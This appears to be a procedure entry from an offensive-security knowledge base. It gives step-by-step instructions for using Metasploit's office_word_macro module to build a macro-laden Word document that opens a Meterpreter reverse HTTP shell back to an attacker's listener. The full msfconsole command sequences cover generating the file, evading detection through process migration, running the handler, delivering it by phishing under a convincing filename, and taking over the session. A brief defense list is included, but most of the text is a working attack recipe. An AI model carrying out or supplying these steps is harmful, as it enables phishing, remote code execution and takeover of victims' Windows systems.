---
id: 28e68a38-9bc7-4f0d-9cb3-b85ef943f724
name: Office-Word-Macro-Payload-Delivery-with-Metasploit
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23.372224+00:00'
updated_at: '2023-04-10T20:36:54.106967+00:00'
tactics:
  - '[[Defense Evasion]]'
  - '[[Execution]]'
techniques:
  - '[[Command-Line Interface]]'
  - '[[Scripting]]'
sub_techniques:
  - '[[Visual Basic]]'
tags:
  - macro
  - office
  - metasploit
  - payload-delivery
commands:
  - '[[commands/generate-malicious-office-word-macro-metasploit]]'
platforms:
  - Windows
tools: []
validated: true
---

# Office-Word-Macro-Payload-Delivery-with-Metasploit

## Summary

This procedure uses the Metasploit Framework to generate a malicious Microsoft Word document (.docm) containing an embedded VBA macro that delivers a payload, such as a Meterpreter reverse shell, to a target system. The macro executes upon the victim enabling content in the document, establishing a connection back to the attacker's listener for remote access and control.

## Description

Attackers employ this technique to achieve initial access or execute code on Windows systems by leveraging Office macros, which are often used in phishing campaigns. The process involves configuring a Metasploit module to create a .docm file with VBA code that downloads and runs the specified payload when the document is opened and macros are enabled. This method bypasses some defenses by mimicking legitimate document functionality and relies on social engineering to trick users into enabling macros. It is effective against environments where macro security is set to low or medium, allowing unauthorized code execution. The payload can facilitate further post-exploitation activities like persistence, lateral movement, or data exfiltration.

## Requirements

1. Metasploit Framework installed and running (typically on Kali Linux or a compatible system).
2. Network access to host a listener for the reverse payload (e.g., HTTP server).
3. Target system running Microsoft Word with macro execution enabled (user must enable content when prompted).
4. Basic knowledge of Metasploit console commands.

## Defense

- Educate users on phishing risks and the dangers of enabling macros in unsolicited documents.
- Configure Office applications to disable macros by default or prompt for high-security warnings.
- Deploy endpoint detection and response (EDR) tools to monitor for suspicious VBA execution or network connections from Office processes.
- Use application whitelisting to block unauthorized macro execution and scan attachments with anti-malware solutions.

## Objectives

1. Generate a malicious .docm file containing an embedded payload.
2. Deliver the file to the target via email or file share to achieve initial access.
3. Establish a reverse connection for command execution on the target system.

## Instructions

### Step 1: Launch Metasploit Console

**Context**: Start the Metasploit Framework console to access the exploit modules for generating the malicious document. This provides the environment to configure and execute the payload delivery module.

**Command** ([[commands/generate-malicious-office-word-macro-metasploit]]):

Run the following sequence in msfconsole to select the module and set parameters:

```msfconsole
use exploit/multi/fileformat/office_word_macro
set payload windows/meterpreter/reverse_http
set LHOST $_LHOST
set LPORT $_LPORT
set DisablePayloadHandler True
set PrependMigrate True
set FILENAME $_FILENAME
exploit -j
```

> This step loads the office_word_macro exploit module, configures a reverse HTTP Meterpreter payload to connect back to your listener IP and port, disables the automatic payload handler (useful if using an external one), enables process migration to evade detection, and sets the output filename. The exploit -j runs it in the background, generating the .docm file in the current directory. Expected output includes confirmation of file creation, such as "[*] File Financial2021.docm generated."

### Step 2: Set Up Payload Listener

**Context**: Before delivering the document, start a listener on the attacker machine to catch the incoming connection from the target once the macro executes. This ensures the payload can establish a session.

Use Metasploit's handler or a tool like netcat:

```msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST $_LHOST
set LPORT $_LPORT
exploit -j
```

> Configure the handler with matching payload settings. Expected output is a waiting listener state, ready to receive connections. If using an external handler, ensure it's running on the specified LHOST and LPORT.

### Step 3: Deliver and Execute on Target

**Context**: Transfer the generated .docm file to the victim via phishing email, shared drive, or other means. The victim must open the file in Word and enable macros for the payload to execute.

No specific command; manually send the file (e.g., via email attachment named convincingly like "Financial2021.docm").

> Upon opening and enabling macros, the VBA code runs, downloads the payload, and connects back. Expected output on attacker side: A new Meterpreter session in msfconsole, e.g., "[*] Meterpreter session 1 opened."

### Step 4: Verify and Interact with Session

**Context**: Confirm successful payload delivery by interacting with the established session to execute commands or escalate access.

In msfconsole, list sessions and interact:

```msfconsole
sessions -l
sessions -i 1
```

> List active sessions and enter the Meterpreter shell. Expected output: Interactive prompt in the target process, allowing commands like sysinfo or shell. Success is confirmed by receiving target system details.
